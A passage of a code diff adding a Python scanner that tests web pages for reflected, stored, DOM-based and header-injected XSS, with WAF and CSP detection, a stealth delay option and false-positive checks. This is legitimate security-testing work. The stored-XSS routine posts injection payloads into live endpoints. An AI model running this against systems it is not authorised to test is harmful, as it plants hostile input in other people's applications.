+                local_ctx = body[max(script_open, marker_idx - 30): marker_idx + 30]
+                if "\\u003C" in local_ctx or "\\u003c" in local_ctx:
+                    start = marker_idx + 1
+                    continue
+
+            # [FIX-4] Tag-stripped guard: if payload has '<' but none found near marker
+            if payload_has_tag:
+                near_start = max(0, marker_idx - 120)
+                near_end   = min(len(body), marker_idx + 120)
+                near       = body[near_start:near_end]
+                if "<" not in near:
+                    # Tags were stripped entirely — not dangerous reflection
+                    start = marker_idx + 1
+                    continue
+
+            return True
+
+        return False
+
+    # ──────────────────────────────────────────────────────────────────────────
+    #  Full-tag structure verification (anti false-positive)
+    # ──────────────────────────────────────────────────────────────────────────
+
+    def _payload_structure_present(self, body: str, payload: str) -> bool:
+        """
+        Verify that the dangerous structure from the payload survived in the body
+        by inspecting a ±_STRUCTURE_WINDOW window around the marker position.
+
+        [FIX-1] Previous implementation searched the FULL body for <script> etc.,
+        producing FPs on any page that contained analytics / CDN script tags
+        unrelated to the injected payload.  All checks are now windowed.
+
+        [FIX-2] JS context-escape payloads (';alert...) previously fell through
+        to unconditional `return True`.  They now require alert() or a JS-injection
+        pattern in the window.
+
+        [FIX-3] Template-injection payloads (${...}, {{...}}, #{...}) require the
+        injection opener to appear near the marker.
+        """
+        pl = payload.lower()
+
+        marker_idx = body.lower().find(self._MARKER.lower())
+        if marker_idx == -1:
+            return False
+
+        win_start = max(0, marker_idx - self._STRUCTURE_WINDOW)
+        win_end   = min(len(body), marker_idx + self._STRUCTURE_WINDOW)
+        window    = body[win_start:win_end].lower()
+
+        # ── <script> tag ─────────────────────────────────────────────────────
+        if "<script" in pl:
+            # The <script must appear in the window, not just anywhere in body
+            return "<script" in window
+
+        # ── Event-handler payloads ────────────────────────────────────────────
+        _HANDLERS = (
+            "onerror=", "onload=", "onfocus=", "ontoggle=",
+            "onmouseover=", "onbegin=", "onclick=", "onmousedown=",
+        )
+        for ev in _HANDLERS:
+            if ev in pl:
+                return ev in window
+
+        # ── javascript: URI ───────────────────────────────────────────────────
+        if "javascript:" in pl:
+            return "javascript:" in window
+
+        # ── JS context escapes  (';alert, ";alert, `...`, etc.) ──────────────
+        # [FIX-2] Was: return True.  Now: require alert() near the marker.
+        if "alert(" in pl or "alert`" in pl:
+            return "alert(" in window or "alert`" in window
+
+        # ── Template injection openers ────────────────────────────────────────
+        # [FIX-3] Require the injection syntax to survive near the marker.
+        for tmpl_open in ("${", "{{", "#{"):
+            if pl.startswith(tmpl_open):
+                return tmpl_open in window
+
+        # ── Polyglot / generic HTML payloads ─────────────────────────────────
+        # [FIX-2] Polyglots previously fell through to return True.
+        # Require at least one angle bracket in the window.
+        if "<" in pl:
+            return "<" in window and ">" in window
+
+        # Fallback: cannot determine structure — do not confirm
+        return False
+
+    # ──────────────────────────────────────────────────────────────────────────
+    #  CSP / WAF detection
+    # ──────────────────────────────────────────────────────────────────────────
+
+    def _detect_csp(self, response: requests.Response) -> bool:
+        csp = response.headers.get("Content-Security-Policy", "")
+        if not csp:
+            return False
+        if "script-src" in csp.lower() and "unsafe-inline" not in csp.lower():
+            return True
+        if "default-src" in csp.lower() and "unsafe-inline" not in csp.lower():
+            return True
+        return False
+
+    def _detect_waf(self, response: requests.Response) -> Optional[str]:
+        status      = response.status_code
+        body_snip   = response.text[:1500].lower()
+        hdrs_keys   = {k.lower() for k in response.headers}
+        hdrs_values = " ".join(v.lower() for v in response.headers.values())
+
+        for waf_name, sigs in _ACTIVE_WAF_SIGS.items():
+            for sig in sigs:
+                if sig in hdrs_keys or sig in hdrs_values or sig in body_snip:
+                    return waf_name
+
+        if status in (403, 406, 419, 429) and len(response.text) < 600:
+            return "generic_waf"
+
+        return None
+
+    # ──────────────────────────────────────────────────────────────────────────
+    #  Parameter pre-screening probe
+    # ──────────────────────────────────────────────────────────────────────────
+
+    def _probe_parameter(self, url: str, param_name: str, baseline_body: str) -> bool:
+        if self.circuit_breaker.is_dead(url):
+            return False
+
+        test_url = self._inject_param(url, param_name, "1'\"<>")
+        r        = self._get(test_url)
+        if r is None:
+            return False
+
+        if abs(len(baseline_body) - len(r.text)) > 50:
+            return True
+
+        b1  = baseline_body[: self._PROBE_SAMPLE_BYTES]
+        b2  = r.text[: self._PROBE_SAMPLE_BYTES]
+        sim = difflib.SequenceMatcher(None, b1, b2).ratio()
+        return sim < 0.97
+
+    # ──────────────────────────────────────────────────────────────────────────
+    #  [1] Reflected XSS
+    # ──────────────────────────────────────────────────────────────────────────
+
+    def _test_reflected(self, url: str, params: Dict[str, str]) -> Dict:
+        result = {
+            "type":         "reflected",
+            "vulnerable":   False,
+            "confidence":   XSSConfidence.NONE.value,
+            "parameters":   [],
+            "payload":      None,
+            "evidence":     [],
+            "waf":          None,
+            "csp_detected": False,
+        }
+
+        # [NEW-B/C] WAF pre-detected by pipeline — skip immediately
+        if self._waf_override:
+            result["waf"] = self._waf_override
+            result["evidence"].append(
+                f"WAF pre-detected by pipeline ({self._waf_override}) — "
+                f"reflected XSS skipped"
+            )
+            return result
+
+        baseline = self._get(url)
+        if baseline is None:
+            result["evidence"].append("Baseline request failed")
+            return result
+
+        if not self._is_response_html(baseline):
+            result["evidence"].append(
+                f"Reflected XSS skipped — non-HTML content-type: "
+                f"{baseline.headers.get('Content-Type', 'unknown')}"
+            )
+            return result
+
+        waf = self._detect_waf(baseline)
+        if waf:
+            result["waf"] = waf
+            result["evidence"].append(f"WAF detected ({waf}) — reflected XSS skipped")
+            return result
+
+        csp_present = self._detect_csp(baseline)
+        result["csp_detected"] = csp_present
+
+        ordered_params = self._prioritize_params(params)
+        baseline_body  = baseline.text
+
+        for param in ordered_params:
+            if _get_exit_flag() or _get_skip_flag():
+                break
+            if self.circuit_breaker.is_dead(url):
+                break
+
+            if not self._probe_parameter(url, param, baseline_body):
+                continue
+
+            all_payloads = self._REFLECTED_PAYLOADS + self._BYPASS_PAYLOADS
+            if self._oob_payloads:
+                all_payloads = all_payloads + self._oob_payloads
+
+            for payload in all_payloads:
+                if _get_exit_flag() or _get_skip_flag():
+                    break
+
+                test_url = self._inject_param(url, param, payload)
+                response = self._get(test_url)
+                if response is None:
+                    continue
+
+                if not self._is_response_html(response):
+                    continue
+
+                # Both checks must pass; order matters (cheap check first)
+                if not self._is_reflected_unescaped(response.text, payload):
+                    continue
+                if not self._payload_structure_present(response.text, payload):
+                    continue
+
+                result["vulnerable"]  = True
+                result["parameters"].append(param)
+                result["payload"]     = payload
+
+                if csp_present:
+                    result["confidence"] = XSSConfidence.MEDIUM.value
+                    result["evidence"].append(
+                        f"Unescaped reflection in [{param}] but CSP present — "
+                        f"exploitability limited: {payload[:60]}"
+                    )
+                else:
+                    result["confidence"] = XSSConfidence.HIGH.value
+                    result["evidence"].append(
+                        f"Unescaped reflection in param [{param}]: {payload[:60]}"
+                    )
+                return result
+
+                if self.stealth:
+                    _safe_sleep(random.uniform(0.5, 1.5))
+
+        return result
+
+    # ──────────────────────────────────────────────────────────────────────────
+    #  [2] Stored XSS
+    # ──────────────────────────────────────────────────────────────────────────
+
+    def _test_stored(self, url: str, params: Dict[str, str]) -> Dict:
+        """
+        POST payloads to each parameter individually, then refetch via GET and
+        check for marker survival.
+
+        [NEW-8] CSRF note: blind POST without a CSRF token will silently receive
+        403/419 on token-protected endpoints.
+        """
+        result = {
+            "type":       "stored",
+            "vulnerable": False,
+            "confidence": XSSConfidence.NONE.value,
+            "parameters": [],
+            "payload":    None,
+            "evidence":   [],
+            "waf":        None,
+            "csrf_note":  (
+                "Stored XSS test uses blind POST without CSRF token. "
+                "Token-protected endpoints may return 403/419 silently — "
+                "a 'not vulnerable' result on those should be verified manually."
+            ),
+        }
+
+        # [NEW-B/C] WAF pre-detected by pipeline — skip immediately
+        if self._waf_override:
+            result["waf"] = self._waf_override
+            result["evidence"].append(
+                f"WAF pre-detected by pipeline ({self._waf_override}) — "
+                f"stored XSS skipped"
+            )
+            return result
+
+        if not params:
+            return result
+
+        waf_blocked = False
+
+        for param in self._prioritize_params(params):
+            if _get_exit_flag() or _get_skip_flag():
+                break
+            if waf_blocked:
+                break
+
+            for payload in self._STORED_PAYLOADS:
+                if _get_exit_flag() or _get_skip_flag():
+                    break
+
+                post_data        = dict(params)
+                post_data[param] = payload
+
+                response = self._post(url, post_data)
+                if response is None:
+                    break
+
+                waf = self._detect_waf(response)
+                if waf:
+                    result["waf"] = waf
+                    result["evidence"].append(
+                        f"WAF detected ({waf}) — stored XSS blocked on [{param}]"
+                    )
+                    waf_blocked = True
+                    break
+
+                if (self._is_response_html(response)
+                        and self._is_reflected_unescaped(response.text, payload)
+                        and self._payload_structure_present(response.text, payload)):
+                    result["vulnerable"]  = True
+                    result["confidence"]  = XSSConfidence.MEDIUM.value
+                    result["parameters"].append(param)
+                    result["payload"]     = payload
+                    result["evidence"].append(
+                        f"Payload echoed in POST response for param [{param}] "
+                        f"(possible stored/reflected): {payload[:60]}"
+                    )
+                    return result
+
+                if self.stealth:
+                    _safe_sleep(random.uniform(1.0, 2.5))
+
+                get_resp = self._get(url)
+                if (get_resp
+                        and self._is_response_html(get_resp)
+                        and self._is_reflected_unescaped(get_resp.text, payload)
+                        and self._payload_structure_present(get_resp.text, payload)):
+                    result["vulnerable"]  = True
+                    result["confidence"]  = XSSConfidence.HIGH.value
+                    result["parameters"].append(param)
+                    result["payload"]     = payload
+                    result["evidence"].append(
+                        f"Payload persisted in GET after POST for param [{param}] "
+                        f"(stored XSS confirmed): {payload[:60]}"
+                    )
+                    return result
+
+        return result
+
+    # ──────────────────────────────────────────────────────────────────────────
+    #  [3] DOM-based XSS
+    # ──────────────────────────────────────────────────────────────────────────
+
+    def _fetch_external_script(self, src: str, base_url: str) -> str:
+        try:
+            if src.startswith("//"):
+                src = "https:" + src
+            elif src.startswith("/"):
+                parsed = urlparse(base_url)
+                src    = f"{parsed.scheme}://{parsed.netloc}{src}"
+            elif not src.startswith("http"):
+                return ""
+
+            if not self._is_safe_external_url(src):
+                return ""
+
+            resp = self._get(src)
+            if resp and resp.status_code == 200:
+                return resp.text[: self._MAX_EXTERNAL_SCRIPT_BYTES]
+            return ""
+        except Exception:
+            return ""
+
+    @staticmethod
+    def _tokenise_js(js_content: str, block_size: int = 40) -> List[List[str]]:
+        """
+        Split js_content into overlapping blocks of block_size logical lines.
+        50% overlap ensures patterns crossing block boundaries are not missed.
+
+        [NEW-6] Tokenises on BOTH newlines AND semicolons for minified bundles.
+        """
+        raw_lines = js_content.splitlines()
+        lines: List[str] = []
+        for raw in raw_lines:
+            if len(raw) > 500:
+                parts = raw.split(";")
+                lines.extend(p.strip() for p in parts if p.strip())
+            else:
+                if raw.strip():
+                    lines.append(raw)
+
+        if not lines:
+            return [[]]
+
+        step   = max(1, block_size // 2)
+        blocks = []
+        for i in range(0, len(lines), step):
+            blocks.append(lines[i: i + block_size])
+        return blocks
+
+    def _test_dom(self, url: str) -> Dict:
+        """
+        Fetch the page, extract inline and external JS, then perform static
+        source-to-sink analysis.
+
+        [FIX-5] Confidence thresholds raised:
+          - 1–2 co-occurring pairs  → no finding (informational note only)
+          - 3–5 pairs               → LOW
+          - 6+ pairs                → MEDIUM
+          Static analysis alone never reaches HIGH or CRITICAL because any
+          modern SPA (React/Vue/Angular/jQuery) will produce several pairs
+          from framework internals even without a real vulnerability.
+
+        [FIX-6] _DOM_SAFE_PATTERNS greatly expanded — see class attribute.
+
+        [FIX-9] inline_scripts regex now uses </script\s*> instead of
+          </script> to correctly match closing tags with optional whitespace
+          before '>'. Fixes CodeQL alert #27 (py/bad-tag-filter).
+        """
+        result = {
+            "type":       "dom",
+            "vulnerable": False,
+            "confidence": XSSConfidence.NONE.value,
+            "sinks":      [],
+            "sources":    [],
+            "evidence":   [],
+            "waf":        None,
+        }
+
+        # [NEW-B/C] WAF pre-detected by pipeline — skip immediately
+        if self._waf_override:
+            result["waf"] = self._waf_override
+            result["evidence"].append(
+                f"WAF pre-detected by pipeline ({self._waf_override}) — "
+                f"DOM analysis skipped"
+            )
+            return result
+
+        response = self._get(url)
+        if response is None:
+            result["evidence"].append("Page fetch failed — DOM analysis skipped")
+            return result
+
+        waf = self._detect_waf(response)
+        if waf:
+            result["waf"] = waf
+
+        body = response.text
+
+        # [FIX-9] \s* added before > to match </script >, </script  >, etc.
+        # Fixes CodeQL #27: py/bad-tag-filter (CWE-20/116/185/186), Severity: High.
+        inline_scripts = re.findall(
+            r"<script[^>]*>([\s\S]*?)</script\s*>", body, re.IGNORECASE
+        )
+
+        external_srcs = re.findall(
+            r'<script[^>]+src=["\']([^"\']+)["\']', body, re.IGNORECASE
+        )
+        external_bodies: List[str] = []
+        for src in external_srcs[:5]:
+            if _get_exit_flag() or _get_skip_flag():
+                break
+            ext_text = self._fetch_external_script(src, url)
+            if ext_text:
+                external_bodies.append(ext_text)
+
+        all_js_parts = inline_scripts + external_bodies
+        js_content   = "\n".join(all_js_parts) if all_js_parts else body
+
+        safe_re = re.compile(
+            "|".join(self._DOM_SAFE_PATTERNS),
+            re.IGNORECASE | re.DOTALL,
+        )
+
+        blocks: List[List[str]] = self._tokenise_js(js_content, block_size=40)
+        danger_pairs: List[Tuple[str, str]] = []
+
+        for block_lines in blocks:
+            clean_lines = [ln for ln in block_lines if not safe_re.search(ln)]
+            clean_block = "\n".join(clean_lines)
+            if not clean_block.strip():
+                continue
+
+            block_sources: List[str] = []
+            block_sinks:   List[str] = []
+
+            for src_pat in self._DOM_SOURCES:
+                if re.search(src_pat, clean_block, re.IGNORECASE):
+                    readable = src_pat.replace(r"\.", ".").replace(r"\s*", "")
+                    block_sources.append(readable)
+
+            for sink_pat in self._DOM_SINKS:
+                if re.search(sink_pat, clean_block, re.IGNORECASE):
+                    readable = (
+                        sink_pat.split(r"\s")[0]
+                        .replace(r"\.", ".")
+                        .replace(r"\b", "")
+                    )
+                    block_sinks.append(readable)
+
+            if block_sources and block_sinks:
+                for src in block_sources:
+                    for snk in block_sinks:
+                        pair = (src, snk)
+                        if pair not in danger_pairs:
+                            danger_pairs.append(pair)
+
+        if danger_pairs:
+            all_sources = list({p[0] for p in danger_pairs})
+            all_sinks   = list({p[1] for p in danger_pairs})
+            pair_count  = len(danger_pairs)
+
+            # [FIX-5] Raised thresholds — 1-2 pairs are too noisy on modern apps
+            if pair_count >= 6:
+                result["vulnerable"] = True
+                result["confidence"] = XSSConfidence.MEDIUM.value
+            elif pair_count >= 3:
+                result["vulnerable"] = True
+                result["confidence"] = XSSConfidence.LOW.value
+            # 1-2 pairs: record as informational only (not flagged as vulnerable)
+
+            result["sources"] = all_sources[:6]
+            result["sinks"]   = all_sinks[:6]
+
+            result["evidence"].append(
+                f"Source(s): {', '.join(all_sources[:3])} → "
+                f"Sink(s): {', '.join(all_sinks[:3])} "
+                f"({pair_count} co-occurrence(s) in same JS block"
+                + (f" — below threshold, informational only" if pair_count < 3 else "")
+                + ")"
+            )
+
+        return result
+
+    # ──────────────────────────────────────────────────────────────────────────
+    #  [4] Header-based XSS
+    # ──────────────────────────────────────────────────────────────────────────
+
+    def _test_header_xss(self, url: str) -> Dict:
+        """
+        Inject the XSS marker into HTTP request headers.
+
+        [FIX-7] _HEADER_PAYLOADS now contains only structural HTML payloads.
+        Bare-text probes ('DEXSS7x', "DEXSS7x", DEXSS7x<br>) were removed
+        because text reflection is not XSS.
+
+        [FIX-8] After _is_reflected_unescaped passes, _payload_structure_present
+        is also checked so that a page which merely echoes header values as text
+        (without executing HTML) is not flagged.
+        """
+        result = {
+            "type":       "header",
+            "vulnerable": False,
+            "confidence": XSSConfidence.NONE.value,
+            "headers":    [],
+            "payload":    None,
+            "evidence":   [],
+            "waf":        None,
+        }
+
+        if self.circuit_breaker.is_dead(url):
+            return result
+
+        # [NEW-B/C] WAF pre-detected by pipeline — skip immediately
+        if self._waf_override:
+            result["waf"] = self._waf_override
+            result["evidence"].append(
+                f"WAF pre-detected by pipeline ({self._waf_override}) — "
+                f"header XSS skipped"
+            )
+            return result
+
+        baseline = self._get(url)
+        if baseline is None:
+            result["evidence"].append("Baseline request failed — header XSS skipped")
+            return result
+
+        if not self._is_response_html(baseline):
+            result["evidence"].append("Header XSS skipped — non-HTML content-type")
+            return result
+
+        waf = self._detect_waf(baseline)
+        if waf:
+            result["waf"] = waf
+            result["evidence"].append(f"WAF detected ({waf}) — header XSS skipped")
+            return result
+
+        for header_name in self._HEADER_INJECTION_TARGETS:
+            if _get_exit_flag() or _get_skip_flag():
+                break
+            if self.circuit_breaker.is_dead(url):
+                break
+
+            for payload in self._HEADER_PAYLOADS:
+                if _get_exit_flag() or _get_skip_flag():
+                    break
+
+                response = self._get(url, extra_headers={header_name: payload})
+                if response is None:
+                    continue
+
+                waf = self._detect_waf(response)
+                if waf:
+                    result["waf"] = waf
+                    break
+
+                # [FIX-8] Both checks required — same as reflected path
+                if (self._is_response_html(response)
+                        and self._is_reflected_unescaped(response.text, payload)
+                        and self._payload_structure_present(response.text, payload)):
+                    result["vulnerable"] = True
+                    result["confidence"] = XSSConfidence.HIGH.value
+                    result["headers"].append(header_name)
+                    result["payload"]    = payload
+                    result["evidence"].append(
+                        f"Unescaped reflection via header [{header_name}]: "
+                        f"{payload[:60]}"
+                    )
+                    return result
+
+                if self.stealth:
+                    _safe_sleep(random.uniform(0.5, 1.5))
+
+        return result
+
+    # ──────────────────────────────────────────────────────────────────────────
+    #  Main entry point
+    # ──────────────────────────────────────────────────────────────────────────
+
+    def test_xss(self, url: str) -> Dict:
+        """
+        Run all enabled XSS detection methods on url.
+
+        Returns:
+            {
+                "tested":             bool,
+                "vulnerable":         bool,
+                "overall_confidence": str,
+                "xss_types_found":    list[str],
+                "waf_detected":       str|None,
+                "csp_detected":       bool,
+                "tests":              list[dict],
+                "message":            str,
+            }
+        """
+        result = {
+            "tested":             False,
+            "vulnerable":         False,
+            "overall_confidence": XSSConfidence.NONE.value,
+            "xss_types_found":    [],
+            "waf_detected":       None,
+            "csp_detected":       False,
+            "tests":              [],
+            "message":            "",
+        }
+
+        params       = self._extract_params(url)
+        has_params   = bool(params)
+        do_reflected = self.xss_type in ("reflected", "all")
+        do_stored    = self.xss_type in ("stored",    "all")
+        do_dom       = self.xss_type in ("dom",       "all")
+        do_header    = self.xss_type in ("header",    "all")
+
+        tests_run: List[Dict] = []
+
+        if do_reflected and has_params:
+            self._cb("reflected")
+            ref_result = self._test_reflected(url, params)
+            tests_run.append(ref_result)
+            if ref_result.get("csp_detected"):
+                result["csp_detected"] = True
+
+        if do_stored and has_params:
+            if not (_get_exit_flag() or _get_skip_flag()):
+                self._cb("stored")
+                sto_result = self._test_stored(url, params)
+                tests_run.append(sto_result)
+
+        if do_dom:
+            if not (_get_exit_flag() or _get_skip_flag()):
+                self._cb("dom")
+                dom_result = self._test_dom(url)
+                tests_run.append(dom_result)
+
+        if do_header:
+            if not (_get_exit_flag() or _get_skip_flag()):
+                self._cb("header")
+                hdr_result = self._test_header_xss(url)
+                tests_run.append(hdr_result)
+
+        if not tests_run:
+            result["message"] = "No testable parameters and no methods applicable"
+            return result
+
+        result["tested"] = True
+        result["tests"]  = tests_run
+
+        for t in tests_run:
+            if t.get("waf"):
+                result["waf_detected"] = t["waf"]
+                break
+
+        vuln_tests  = [t for t in tests_run if t.get("vulnerable")]
+        types_found = [t["type"] for t in vuln_tests]
+        result["xss_types_found"] = types_found
+
+        if vuln_tests:
+            result["vulnerable"] = True
+
+            score = 0
+            for t in vuln_tests:
+                conf = t.get("confidence", XSSConfidence.NONE.value)
+                rank = _CONF_RANK.get(conf, 0)
+                score += rank
+
+            if score >= 5:
+                result["overall_confidence"] = XSSConfidence.CRITICAL.value
+            elif score >= 3:
+                result["overall_confidence"] = XSSConfidence.HIGH.value
+            elif score >= 2:
+                result["overall_confidence"] = XSSConfidence.MEDIUM.value
+            else:
+                result["overall_confidence"] = XSSConfidence.LOW.value
+
+            result["message"] = (
+                f"XSS detected — type(s): {', '.join(types_found)}  "
+                f"confidence: {result['overall_confidence']}"
+            )
+        else:
+            result["message"] = "No XSS vulnerability detected"
+
+        return result
